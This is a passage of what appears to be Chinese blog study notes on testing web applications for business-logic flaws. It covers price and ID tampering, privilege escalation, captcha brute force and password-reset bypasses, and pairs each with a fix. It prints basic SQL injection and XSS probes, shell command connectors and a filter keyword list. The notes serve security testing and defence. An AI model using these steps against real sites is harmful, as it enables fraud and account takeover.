title="修复建议"></a>修复建议</h3><p>用户登录后写信、发送信息时需要通过Session机制判断用户身份，如果需要客户端传输邮箱、发件人，服务端需要校验邮箱、发件人是否和登录者的身份一致，防止被攻击者篡改用于钓鱼攻击。</p><h2 id="商品编号篡改测试"><a href="#商品编号篡改测试" class="headerlink" title="商品编号篡改测试"></a>商品编号篡改测试</h2><p>修改上皮内金额，篡改商品编号，低价购买高价商品。</p><h3 id="测试过程-9"><a href="#测试过程-9" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>登录积分商城，挑选一个商品，编号为goods_id=xxx5ff7,需要30积分。</li><li>选择5积分商品，抓包修改goods_id，替换为xxx5ff7，替换成功，用5积分购买了30积分商品。</li></ul><h3 id="修复建议-12"><a href="#修复建议-12" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议商品金额不要在客户端传入，防止被篡改，或确实需要在客户端传入金额，则服务端在收到请求后必须检查商品价格与交易金额一直，或对支付金额做签名校验。</p><h2 id="竞争条件测试"><a href="#竞争条件测试" class="headerlink" title="竞争条件测试"></a>竞争条件测试</h2><p>竞争条件：当两个或多个进程试图在同一时刻访问共享内存，或读写某些共享数据时，最后的竞争结果，取决于线程执行的顺序（线程运行时序），成为竞争条件。</p><p>在web安全中，在服务端逻辑与数据库读写存在时序问题时，就可能存在竞争条件漏洞，攻击者通常利用多线程并发请求，在数据库中的余额字段更新之前，多次兑换积分或购买商品，从中获利。</p><h3 id="测试过程（教程只写了漏洞没写测试漏洞）"><a href="#测试过程（教程只写了漏洞没写测试漏洞）" class="headerlink" title="测试过程（教程只写了漏洞没写测试漏洞）"></a>测试过程（教程只写了漏洞没写测试漏洞）</h3><p>攻击者在提交订单时抓包，设置很多个线程重放此包，在众多请求中，个别请求就有可能争取绕过金额，次数的判断，交易成功，攻击者从中获利。</p><h3 id="修复建议-13"><a href="#修复建议-13" class="headerlink" title="修复建议"></a>修复建议</h3><p>在处理订单、支付等关键业务时，使用悲观锁或乐观锁保证事务的ACID特性（原子性、一致性、隔离性、持久性），并避免数据脏读（一个事务读取了另一个事务未提交的数据），解决竞争条件和并发操作可能带来的相关业务问题</p><h1 id="业务授权访问模块"><a href="#业务授权访问模块" class="headerlink" title="业务授权访问模块"></a>业务授权访问模块</h1><h2 id="非授权访问测试"><a href="#非授权访问测试" class="headerlink" title="非授权访问测试"></a>非授权访问测试</h2><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息，可以尝试在登录某网站前台或后台之后，将相关的页面链接复制到其他浏览器或其他电脑上进行访问</p><h3 id="测试过程-10"><a href="#测试过程-10" class="headerlink" title="测试过程"></a>测试过程</h3><p>在ie浏览器中登录某网站进行交费，复制缴费成功的url，在火狐浏览器里访问，成功访问</p><h3 id="修复建议-14"><a href="#修复建议-14" class="headerlink" title="修复建议"></a>修复建议</h3><p>未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露，所以对未授权访问页面做Session认证，并对用户访问的每一个url做身份鉴别，正确地校验用户ID及Token等。</p><h2 id="越权测试"><a href="#越权测试" class="headerlink" title="越权测试"></a>越权测试</h2><p>水平越权：相同权限的不同用户可以互相访问</p><p>垂直越权：使用权限低的用户可以访问权限较高的用户</p><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><ul><li>保存用户任务ID,抓包看到请求中关键参数ID,若可以更改能看到其他提交者，则存在水平越权漏洞，爆破自动更改关键参数ID.</li></ul><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>登录一个普通用户，超级管理员账号为admin，找到修改密码，将密码改为789，确定修改，抓包，发现两个参数，uid和pwd，即用户名和密码，将uid值改为admin，密码789不变。</p><p>提交修改后的数据包提示密码修改成功，登录管理员账号成功。</p><h3 id="修复建议-15"><a href="#修复建议-15" class="headerlink" title="修复建议"></a>修复建议</h3><p>服务端需校验身份唯一性，自己的身份只能查看、修改、删除、添加自己的信息</p><h1 id="输入-x2F-输出模块测试"><a href="#输入-x2F-输出模块测试" class="headerlink" title="输入/输出模块测试"></a>输入/输出模块测试</h1><h2 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h2><p>sql注入就是通过把sql命令插入web表单提交或输入域名页面请求的查询字符串，最终达到欺骗服务器执行恶意的sql命令的目的。</p><p>按照请求类型分为：get型，post型，cookie型。</p><p>get和post区别是由表单的提交方式决定的，按照数据类型可分为数字型和字符型，数字型不用闭合前面的sql语句，字符型需要闭合。</p><p>测试方法分为报错型、延时型、盲注型、布尔型等。</p><p>数字型注入测试方法如下：</p><ul><li>正常请求，查看页面</li><li>在请求的参数后加and 1=1，如果可以添加执行，则和第一步的返回页面并无差异。</li><li>在请求参数后加and 1=2，如果返回页面与第二步页面明显不同，或有所差异，则断定存在数字型注入</li></ul><p>字符型注入测试方法如下：</p><ul><li>正常请求查看页面（如查询admin用户信息，则返回admin用户的信息）</li><li>在查询的参数后加 <code>'or 1=1</code>,加单引号的目的是闭合前面的sql语句并与后面的语句形成语法正确的sql语句，如果可以添加并能够执行，则返回除admin用户外所有用户的信息，这时可以判断存在字符型注入。</li></ul><h3 id="测试过程-11"><a href="#测试过程-11" class="headerlink" title="测试过程"></a>测试过程</h3><p>略</p><h3 id="修复建议-16"><a href="#修复建议-16" class="headerlink" title="修复建议"></a>修复建议</h3><p>每个提交信息的客户端页面、通过服务器端脚本（JSP、ASP、ASPX、PHP等）生成的客户端页面、提交的表单（FORM）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。</p><ul><li>Sql语句关键词：and,or ,select,declare,update,xp_cmdshell;</li><li>sql语句特殊符号<code>'、</code>，<code>''、</code>等</li></ul><p>web应用系统接入数据库服务器使用的用户不应为系统管理员，用户角色应遵循最小权限原则。</p><h2 id="XSS测试"><a href="#XSS测试" class="headerlink" title="XSS测试"></a>XSS测试</h2><p>跨站脚本漏洞是web应用程序在将数据输出到网页的时候存在问题，导致恶意攻击者可以在往web页面里插入而已js,html代码，并将构造的而已数据显示在页面的漏洞中。攻击者一般利用此漏洞窃取或操纵客户会话和cookie，用于模仿合法用户，从而使攻击者以该用户身份查看或变更与用户记录以及执行事务。</p><p>跨站一般情况下主要分为存储型xss，反射性xss，DOM型跨站。</p><p>存储型xss脚本可直接写入服务端数据库，反射性不写入数据库，由服务端解析后在浏览器生成一段类似<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>的脚本。</p><p>反射性跨站测试主要是在url或输入框内插入一段跨站脚本，观察是否能弹出对话框。</p><p>存储型xss主要是在网站的留言板、投诉、建议等输入框内输入一段跨站脚本，看能否插入数据库，插入成功的表现为当网站管理人员查看该留言时，会执行跨站语句，或者当普通用户再次1访问该页面时，会执行跨站语句，如弹出对话框。</p><h3 id="修复建议-17"><a href="#修复建议-17" class="headerlink" title="修复建议"></a>修复建议</h3><p>每个提交信息的客户端页面、通过服务器端脚本（jsp,asp,aspx,php）生成的客户端页面、提交的表单（form）或发出的链接请求中包含的所有变量，必须对变量的值进行检查，过滤其中包含的特殊字符，或对字符进行转义处理。</p><ul><li><p>HTML标签的<code>&lt;、“、’、%</code>等，以及这些符号的Unicode值</p></li><li><p>客户端脚本<code>（JavaScript、VBScript）</code>关键字：<code>JavaScript、script</code>等。</p></li><li><p>对于信息搜索功能，不应在搜索结果页面中回显搜索内容。同时应设置出错页面，防止Web服务器发生内部错误时，将错误信息返回给客户端</p></li><li><p>定义允许的行为，确保Web应用程序根据预期结果的严格定义来验证所有输入参数（Cookie、标头、查询字符串、表单、隐藏字段等）。</p></li><li><p>检查POST和GET请求的响应，以确保返回的对象是预期的内容且有效</p></li><li><p>通过对用户提供的数据进行编码，从用户输入中移除冲突的字符、括号和单双引号。这将防止插入的脚本以可执行的格式发送给最终用户。</p></li><li><p>只要可能，就应将客户端提供的所有数据限制为字母数字数据。使用此过滤机制时，如果用户输入<code>“&lt;script&gt;alertdocumentcookie（'aaa'）&lt;/script&gt;”</code>，将缩减为<code>“scriptalertdocumentcookiescript”</code>。如果必须使用非字母数字字符，请先将其编码为HTML 实体，然后再将其用在HTTP响应中，这样就无法将它们用于修改HTML文档的结构。</p></li><li><p>使用双因素客户身份验证机制，而非单因素身份验证</p></li><li><p>在修改或使用脚本之前，验证脚本的来源。</p></li><li><p>不要完全信任其他人提供的脚本并用在自己的代码中</p></li></ul><h2 id="命令执行测试"><a href="#命令执行测试" class="headerlink" title="命令执行测试"></a>命令执行测试</h2><p>在应用需要调用一些外部程序去处理内容的情况下，会用到一些执行系统命令的函数，如php中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。测试中如果没有对参数（cmd=、command、excute=等）进行过滤，就可以直接造成命令执行漏洞或配合绕过及命令连接符（<code>&amp;、|、||、；</code>）等进行命令执行漏洞测试</p><h3 id="测试过程-12"><a href="#测试过程-12" class="headerlink" title="测试过程"></a>测试过程</h3><p>由于未对register_key参数进行过滤可能存在命令执行漏洞，抓包并对其进行测试，构造命令执行语句并执行成功，证明此参数为经严格过滤造成命令执行漏洞。</p><p>（略，哪天找时间搭一个dvwa靶场）</p><h3 id="修复建议-18"><a href="#修复建议-18" class="headerlink" title="修复建议"></a>修复建议</h3><p>尽量少用执行命令的函数或者直接禁用，参数值尽量使用引号包括在使用动态函数之前，确保使用的函数是指定的函数之一，在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义。</p><h1 id="回退模块测试"><a href="#回退模块测试" class="headerlink" title="回退模块测试"></a>回退模块测试</h1><h2 id="回退测试"><a href="#回退测试" class="headerlink" title="回退测试"></a>回退测试</h2><p>web业务在密码修改成功后或者订单付款成功后等业务模块，在返回上一步重新修改密码或者重新付款时存在重新设置密码或者付款的功能，这时如果能返回上一步重复操作，而且还能更改或者重置结果，则存在业务回退漏洞。</p><h3 id="修复建议-19"><a href="#修复建议-19" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于业务流程有多步的情况，如修改密码或重置密码等业务，首先判断该步骤的请求是否是上一步骤的业务所发起的，如果不是则返回错误提示或页面失效。</p><h1 id="验证码机制测试"><a href="#验证码机制测试" class="headerlink" title="验证码机制测试"></a>验证码机制测试</h1><h2 id="验证码暴力破解测试"><a href="#验证码暴力破解测试" class="headerlink" title="验证码暴力破解测试"></a>验证码暴力破解测试</h2><p>验证码机制主要被用于防止暴力破解，防止DDoS攻击，识别用户身份等，常见的验证码主要有图片验证码、邮件验证码、短信验证码、滑动验证码和语音验证码.</p><h3 id="测试过程-13"><a href="#测试过程-13" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者填写任意手机号进行性注册，服务器向攻击者填写的手机号码发送短信验证，攻击者设置验证码范围，对验证码进行暴力破解，通过返回数据包判断是否破解成功，然后通过破解成功的验证码完成注册。</p><h3 id="修复建议-20"><a href="#修复建议-20" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>设置验证码的失效时间，建议为180秒</li><li>限制单位时间内验证码的失败尝试次数，如五分钟内连续失败5次即锁定该账号15分钟</li></ul><h2 id="验证码重复使用测试"><a href="#验证码重复使用测试" class="headerlink" title="验证码重复使用测试"></a>验证码重复使用测试</h2><p>在网站的登录或评论等页面，如果验证码认证成功后没有将session及时清空，将会导致验证码首次认证成功之后可重复使用，测试时可以抓取携带验证码的数据包重复提交，查看是否提交成功。</p><h3 id="测试过程-14"><a href="#测试过程-14" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者填写投诉建议，输入页面验证码，抓取提交的数据包，使用发包工具对数据包进行重复提交，然后查看投诉建议页面是否成功提交了多个投诉信息。</p><p>输入内容，输入验证码，抓数据包，并修改内容参数的值，通过bp重复提交投诉信息，经过暴力重复提交，客户端显示提交成功，用首次验证码成功多次提交</p><h3 id="修复建议-21"><a href="#修复建议-21" class="headerlink" title="修复建议"></a>修复建议</h3><p>针对验证认证次数问题，建议验证码在一次认证成功后，服务端清空认证成功的Session，有效防止一次认证反复使用的问题</p><h2 id="验证码客户端回显测试"><a href="#验证码客户端回显测试" class="headerlink" title="验证码客户端回显测试"></a>验证码客户端回显测试</h2><p>当验证码在客户端生成而非服务器端生成时，就会造成该问题，当客户端需要和服务端进行交互发送验证码时，可借助浏览器的工具查看客户端与服务器进行交互的详细信息</p><h3 id="测试过程-15"><a href="#测试过程-15" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者进入找回密码页面，输入手机号与证件号，获取验证码，服务器会向手机发送验证码，通过浏览器工具查看返回包信息，如果返回包中含验证码，证明存在此类问题。</p><h3 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>禁止验证码在本地客户端生成，应采用服务器端验证码生成机制</li><li>设置验证码的时效性，如180秒过期</li><li>验证码应随机生成，且使用一次即失效</li></ul><h2 id="验证码绕过测试"><a href="#验证码绕过测试" class="headerlink" title="验证码绕过测试"></a>验证码绕过测试</h2><p>通过修改提交服务器返回的数据，可以实现绕过验证码，执行我们的请求</p><h3 id="测试过程-16"><a href="#测试过程-16" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者进入注册账户页面，输入任意手机号码，获取验证码，在注册账户页面填写任意验证码，提交请求并抓包，使用抓包工具查看并修改返回包信息，转发返回数据包，查看是否注册成功。</p><h3 id="修复建议-23"><a href="#修复建议-23" class="headerlink" title="修复建议"></a>修复建议</h3><p>在服务端增加验证码的认证机制，对客户端提交的验证码进行二次校验。</p><h2 id="验证码自动识别测试"><a href="#验证码自动识别测试" class="headerlink" title="验证码自动识别测试"></a>验证码自动识别测试</h2><p>以图形验证码为例，一般队医此类验证码的识别流程为：图像二值化处理-&gt;去干扰-&gt;字符分割-&gt;字符识别</p><p>图像二值化就是将图像上像素点的灰度值设置为0或255，也就是将整个图像呈现出明显的黑白效果</p><p>为防止验证码被自动识别，通常加入一些点、线、色彩之类的方式进行图像干扰。</p><p>字符分割主要包括从验证码图像中分割出字符区域，以及把字符区域划分成单个字符</p><p>字符识别就是把处理后的图片还原回字符文本的过程。</p><h3 id="测试过程-17"><a href="#测试过程-17" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者访问网站登录页面，通过刷新你验证码页面查看验证码组成规律，进行图像二值化、去干扰等处理，并进行人工对比，存储成功识别的验证码包，截入工具，利用工具对登录页面进行暴力破解，根据返回包的大小和关键字判断是否破解成功。</p><p>用bp抓登录包，将登录包放在PKAV HTTP Fuzzer工具的请求包中，设置验证码标志位，用户名和密码标志位。</p><p>进行验证码爆破，发现长度为611的返回包，可成功登录网站。</p><h3 id="修复建议-24"><a href="#修复建议-24" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>增加背景元素的干扰，如背景色，背景字母等</li><li>字符的字体进行扭曲、粘连</li><li>使用公式、逻辑验证方法等作为验证码，如四则运算法、问答题等</li><li>图形验证码和使用者相关，比如选择联系人头像、选择购买过的物品等作为验证码</li></ul><h1 id="业务数据安全测试"><a href="#业务数据安全测试" class="headerlink" title="业务数据安全测试"></a>业务数据安全测试</h1><h2 id="商品支付金额篡改测试"><a href="#商品支付金额篡改测试" class="headerlink" title="商品支付金额篡改测试"></a>商品支付金额篡改测试</h2><p>通常在订购类交易流程中，容易出现服务器端未对用户提交的业务数据进行强制校验，过度信赖客户端提交的业务数据而导致的商品金额篡改漏洞</p><h3 id="测试过程-18"><a href="#测试过程-18" class="headerlink" title="测试过程"></a>测试过程</h3><p>该测试主要针对订单生成过程中存在商品支付金额校验不完整而产生业务安全风险点，通常导致攻击者用实际支付远低于订单支付的金额订购商品的业务逻辑漏洞。</p><p>选择购卡面值进入支付平台，抓包篡改支付请求中明文金额字段，跳转支付平台，完成篡改后订单金额支付流程</p><h3 id="修复建议-25"><a href="#修复建议-25" class="headerlink" title="修复建议"></a>修复建议</h3><p>商品信息，如金额、折扣等原始数据的校验应来自于服务器端，不应接受客户端传递过来的值</p><h2 id="商品订购数量篡改测试"><a href="#商品订购数量篡改测试" class="headerlink" title="商品订购数量篡改测试"></a>商品订购数量篡改测试</h2><p>商品数量篡改测试是通过在业务流程中抓包修改订购商品数量等字段，如将请求中的商品数量修改成任意非预期数额、负数等后进行提交，查看业务系统能否以修改后的数量完成业务流程。</p><h3 id="测试过程-19"><a href="#测试过程-19" class="headerlink" title="测试过程"></a>测试过程</h3><p>将商品放入购物车，在购物车中进行礼品兑换，确认商品订单准备进行数据包信息篡改，抓包，将商品数量参数改为负数，并保存，</p><p>可以看到购物车中实际支付积分已经变为负积分。</p><p>添加配送信息，确认订单信息，获取验证码后通过，进入订单确认页面，提交订单订购请求。</p><h3 id="修复建议-26"><a href="#修复建议-26" class="headerlink" title="修复建议"></a>修复建议</h3><p>服务端应当考虑交易风险控制，对产生异常情况的交易行为（如用户积分数额为负值、兑换库存数量为0的商品等）应当直接予以限制、阻断，而非继续完成整个交易流程</p><h2 id="前端JS限制绕过测试"><a href="#前端JS限制绕过测试" class="headerlink" title="前端JS限制绕过测试"></a>前端JS限制绕过测试</h2><p>商品在限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓取客户端发送的请求包修改JS端生成处理的交易数据，如将请求中的商品数量改为大于最大数限制的值，查看能否以非正常业务交易数据完成业务流程。</p><h3 id="测试过程-20"><a href="#测试过程-20" class="headerlink" title="测试过程"></a>测试过程</h3><p>该项测试主要针对电商平台由于交易限制机制不严谨、不完善而导致的一些业务逻辑问题</p><p>购买限购商品，数量为2份，加入购物车。</p><p>客户端在前端浏览器使用js做了购买限制，尝试绕过限制提交购买请求，可以通过抓包修改数量字段，改为100个后成功提交。</p><h3 id="修复建议-27"><a href="#修复建议-27" class="headerlink" title="修复建议"></a>修复建议</h3><p>商品信息，如金额、折扣、数量等原始数据的校验应来自于服务器端，不应该完全相信客户端传递过来的值。类似的跨平台支付业务，涉及平台之间接口调用，一定要做好对重要数据的完整性校验，确保业务重要数据在平台间传输的一致。</p><h2 id="请求重放测试（不理解）"><a href="#请求重放测试（不理解）" class="headerlink" title="请求重放测试（不理解）"></a>请求重放测试（不理解）</h2><p>商品首次购买成功后，参照订购商品的正常流程请求，进行完全模拟正常订购业务流程的重放操作，可以实现一次购买多次收获等违背正常业务逻辑的结果。</p><h3 id="测试过程-21"><a href="#测试过程-21" class="headerlink" title="测试过程"></a>测试过程</h3><p>在生成订单流程时抓取订购请求，观察每次订购相同商品的请求是否存在不同的随机token、可变参数等，若有则检查这些随机数的变化情况和失效请款，是否在当前订购流程中唯一有效。</p><p>尝试重放之前已经完成流程的订购请求，观察服务器端是否做出正确响应，若订购再次生效，订单再次生成则表明服务器存在脆弱性。</p><h3 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h3><p>用户每次订单token不应该能重复提交，避免产生重放订购请求的情况。在服务器订单生成关键环节，应该对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验。</p><h2 id="业务上限测试"><a href="#业务上限测试" class="headerlink" title="业务上限测试"></a>业务上限测试</h2><p>业务上限测试主要是针对一些电商类应用程序在进行业务办理流程中，服务端没有对用户提交的查询范围、订单数量、金额等数据进行严格校验而引发的一些业务逻辑漏洞。在业务流程中通过向服务端提交高于或低于预期的数据以校验服务端是否对所提交的数据做预期强校验。存在此类脆弱性的应用程序，通常表现为查询到超出预期的信息、订购或兑换超过预期范围的商品等。</p><h3 id="测试过程-22"><a href="#测试过程-22" class="headerlink" title="测试过程"></a>测试过程</h3><p>判断应用程序是否对业务预期范围外的业务请求做出正确回应。</p><p>在业务查询中只允许登录用户查询6个月内受理记录，单抓包分析出查询请求中存在明文字段month，修改查询范围到6个月以上提交，可以成功，表明该功能不符合业务要求</p><h3 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h3><p>在服务器端应对订单token对应的订购信息内容、用户身份、用户可用积分等进行强校验，服务端应考虑交易风险控制，对产生异常情况的交易行为直接予以限制、阻断，停止完成整个交易流程。</p><h1 id="业务流程乱序测试"><a href="#业务流程乱序测试" class="headerlink" title="业务流程乱序测试"></a>业务流程乱序测试</h1><h2 id="业务流程绕过测试"><a href="#业务流程绕过测试" class="headerlink" title="业务流程绕过测试"></a>业务流程绕过测试</h2><p>该项主要针对业务流程的处理流程是否正常，确保攻击者无法通过技术手段绕过某些重要流程步骤，检验办理业务过程中是否有控制机制来保证其遵循正常流程。</p><h3 id="测试过程-23"><a href="#测试过程-23" class="headerlink" title="测试过程"></a>测试过程</h3><p>攻击者访问注册页面，注册测试账户，充值提交并抓取数据包，填写任意充值金额并抓包，获取订单号，利用订单号构造充值链接并访问链接，查看是否充值成功，如果充值成功说明存在业务流程绕过问题。</p><h3 id="修复建议-30"><a href="#修复建议-30" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对敏感信息如身份ID、账号密码、订单号、金额等进行加密处理，并在服务端对其进行二次比对。</p><h1 id="密码找回模块测试"><a href="#密码找回模块测试" class="headerlink" title="密码找回模块测试"></a>密码找回模块测试</h1><h2 id="验证码客户端回显测试-1"><a href="#验证码客户端回显测试-1" class="headerlink" title="验证码客户端回显测试"></a>验证码客户端回显测试</h2><p>找回密码测试中要注意验证码是否会回显在响应中。</p><h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><p>填入要找回的账号，bp抓返回包找到正确验证码，将正确验证码发送给服务端已达到密码重置的目的。</p><h3 id="修复建议-31"><a href="#修复建议-31" class="headerlink" title="修复建议"></a>修复建议</h3><p>避免返回验证码到响应包中，验证码一定要放在服务端校验</p><h2 id="验证码暴力破解测试-1"><a href="#验证码暴力破解测试-1" class="headerlink" title="验证码暴力破解测试"></a>验证码暴力破解测试</h2><p>找回密码功能模块中通常会将用户凭证发送到用户自己才可以看到的手机号或邮箱中，但有些应用在验证码发送功能模块中验证码位数及复杂性较弱，也没有对验证码做次数限制而导致验证码可被暴力枚举并修改任意用户密码。</p><h3 id="测试过程-24"><a href="#测试过程-24" class="headerlink" title="测试过程"></a>测试过程</h3><p>在app的找回密码功能，输入手机号并发送验证码（4位），</p><p>填写任意4位验证码，当请求包被拦截后可以观察到用户手机号，验证码（自己填的那个），密码。</p><p>将请求包发送到bp的Intruder模块中，并把验证码参数进行枚举测试。</p><h3 id="修复建议-32"><a href="#修复建议-32" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对用户输入的验证码校验采取错误次数限制并提高验证码的复杂度。</p><h2 id="接口参数账号修改测试"><a href="#接口参数账号修改测试" class="headerlink" title="接口参数账号修改测试"></a>接口参数账号修改测试</h2><p>找回密码功能逻辑中常常会在用户修改密码接口提交此参数中存在传递用户账号的参数，而用户账号参数作为一个可控的变量是可以被篡改的，从而导致修改账号密码的凭证或修改的目标账号出现偏差，最终造成任意账号密码修改的漏洞。</p><p>通常在找回密码逻辑中，服务端会要求用户提供要修改的账号，给这个账号发送只有账号主人才能看到的凭证，但如果服务端对账号的控制逻辑不当，就会导致原有账号被篡改为其他账号，服务端把凭证发送给篡改后的账号的邮箱或手机，最终造成可利用凭证重置任意账号密码的漏洞。</p><h3 id="测试流程-1"><a href="#测试流程-1" class="headerlink" title="测试流程"></a>测试流程</h3><p>拦截前端请求，通过修改请求内邮箱或手机号等参数，将修改后数据发送给服务器进行欺骗，达到密码重置的目的。</p><h3 id="修复建议-33"><a href="#修复建议-33" class="headerlink" title="修复建议"></a>修复建议</h3><p>对找回密码的token做一对一的校验，一个token只能修改一个用户，同时保证token不泄露。</p><h2 id="Response状态值修改测试"><a href="#Response状态值修改测试" class="headerlink" title="Response状态值修改测试"></a>Response状态值修改测试</h2><p>修改请求的响应结果来达到密码啊重置的目的。该漏洞利用方式通常在服务端发送某个密码重置的凭证请求后，出现特定的响应值，比如true、1、ok、success等，网站看到回显内容为特定值后即修改密码，通常这种漏洞的回显值校验是在客户端进行的，所以只需要修改回显即可。</p><h3 id="修复建议-34"><a href="#修复建议-34" class="headerlink" title="修复建议"></a>修复建议</h3><p>不要在前端利用服务端返回值判断是否可以修改密码，要把整个校验环节交给服务端验证。</p><h2 id="Session覆盖测试（任意密码重置漏洞）"><a href="#Session覆盖测试（任意密码重置漏洞）" class="headerlink" title="Session覆盖测试（任意密码重置漏洞）"></a>Session覆盖测试（任意密码重置漏洞）</h2><p>找回密码逻辑漏洞测试中也会遇到参数不可控的情况，比如要修改的用户名或者绑定的手机号无法在提交参数时修改，服务端通过读取当前session会话来判断要修改密码的账号，这种情况下能否对Session中的内容做修改以达到任意密码重置的目的呢？</p><p>在某网站中的找回密码功能中，业务逻辑是：由用户使用手机进行注册，然后服务端向手机发送验证码短信，用户输入验证码提交后，进入密码重置页面。</p><p>对网站中Session覆盖的测试如下：</p><p>（1）需要准备自己的账号接收凭证（短信验证码）；</p><p>（2）获得凭证校验成功后进入密码重置页面；</p><p>（3）在浏览器新标签重新打开找回密码页面，输入目标手机号；</p><p>（4）此时当前 Session账户已经被覆盖，重新回到第二步中打开的重置密码页面即可重置目标手机号。</p><h3 id="测试过程-25"><a href="#测试过程-25" class="headerlink" title="测试过程"></a>测试过程</h3><ul><li>在找回密码页面输入A手机号，接受验证码，通过验证后，进入密码重置页面</li><li>打开一个新标签，进入找回密码的第一步页面，输入B手机号码，向B手机号发送验证码，虽然无法拿到B手机号验证码，但是服务端已经将当前Session会话设置为B手机号的用户，这时候再刷新A手机号密码重置页面。</li><li>刷新后A手机号已经改为B手机号，说明Session成功覆盖。</li></ul><h3 id="修复建议-35"><a href="#修复建议-35" class="headerlink" title="修复建议"></a>修复建议</h3><p>Session覆盖类似于账号参数的修改，只是以控制当前Session的方式篡改了要重置密码的账号，在重置密码请求中一定要对修改的账号和凭证是否一致做进一步的校验。</p><h2 id="弱Token设计缺陷测试（看懂了但是不会做）"><a href="#弱Token设计缺陷测试（看懂了但是不会做）" class="headerlink" title="弱Token设计缺陷测试（看懂了但是不会做）"></a>弱Token设计缺陷测试（看懂了但是不会做）</h2><p>在找回密码功能中，网站向用户邮箱发送找回密码链接，用户进入链接进入密码重置页面，链接通常会加入校验参数来确认有效性，通过校验参数的值与数据库生成的值是否一致来判断当前找回密码的链接是否有效。</p><p>例如，网站给出的找回密码的url如下，单击这个链接将跳转到重置密码页面。</p><p><code>http://www.xxx.com/findpwd?uid=xx-uu-xx-sxx&amp;token=1497515314</code></p><p>uid对应修改密码的账号，token就是校验参数，cancel系统使用时间戳生成token，通过时间格式化后发现确实是日期，那么token就是可预测的一个时间范围，可以暴力枚举。</p><h3 id="测试流程-2"><a href="#测试流程-2" class="headerlink" title="测试流程"></a>测试流程</h3><ul><li>在密码找回功能中填写邮箱，多点击几次发送验证信息，可以在邮箱中获得多个找回密码的凭证，多封密码找回邮件，关照凭证规律，通过对比发现token不断变化，参数通过base64编码</li><li>解码查看，发现token值是base64(用户邮箱+随机4位验证码)，就可以暴力枚举获得验证码，加上用户名加上base64编码，最后得到任意用户的密码找回凭证。</li></ul><h3 id="修复建议-36"><a href="#修复建议-36" class="headerlink" title="修复建议"></a>修复建议</h3><p>密码找回token不能使用时间戳或用户邮箱和较短有规律可循的数字字符，应当使用复杂的token生成机制让攻击者无法推测出具体的值。</p><h2 id="密码找回流程绕过测试"><a href="#密码找回流程绕过测试" class="headerlink" title="密码找回流程绕过测试"></a>密码找回流程绕过测试</h2><p>用户修改密码需要向服务器发送修改密码请求，服务器通过后再修改数据库中相应的密码，所以在测试中我们首先要收集三个步骤的请求接口，这样我们可以指姐姐跳过凭证校验的接口去尝试直接重置密码。</p><h3 id="测试流程-3"><a href="#测试流程-3" class="headerlink" title="测试流程"></a>测试流程</h3><ul><li>先注册一个账号用于测试，在找回密码页面输入账号，找回密码页面url为<code>GET/account/findPassword.html</code></li><li>进入凭证验证流程，url为<code>GET/forgetpwd/findPassNext.do</code></li><li>通过验证后进入重置密码，<code>GET/forgetpwd/emailValidateNext.do</code></li><li>获取到三个步骤的url，尝试在输入账号后进入验证身份页面，修改该url为密码重置的url</li><li>经测试发现无需验证身份就可以直接进入重置密码页面，绕过了验证身份一步。</li></ul><h3 id="修复建议-37"><a href="#修复建议-37" class="headerlink" title="修复建议"></a>修复建议</h3><p>防止跳过验证步骤一定要在后端逻辑校验中确认上一步流程已经完成。</p><h1 id="业务接口调用模块测试"><a href="#业务接口调用模块测试" class="headerlink" title="业务接口调用模块测试"></a>业务接口调用模块测试</h1><h2 id="接口调用重放测试"><a href="#接口调用重放测试" class="headerlink" title="接口调用重放测试"></a>接口调用重放测试</h2><p>在短信、邮件调用业务或生成业务数据环节中，对业务环节进行调用(重放)测试，若业务经过调用后多次生成有效的业务或数据结果，可判断为存在接口调用问题</p><h3 id="测试流程-4"><a href="#测试流程-4" class="headerlink" title="测试流程"></a>测试流程</h3><p>在购买机票提交订单环节抓包，bp对生成订单的数据包进行重放测试。订单在一分钟内重复生成。</p><h3 id="修复建议-38"><a href="#修复建议-38" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>对生成订单环节采用验证码机制，防止生成数据业务被恶意调用</li><li>每一个订单使用唯一的token，订单提交一次后，token失效</li></ul><h2 id="接口调用遍历测试"><a href="#接口调用遍历测试" class="headerlink" 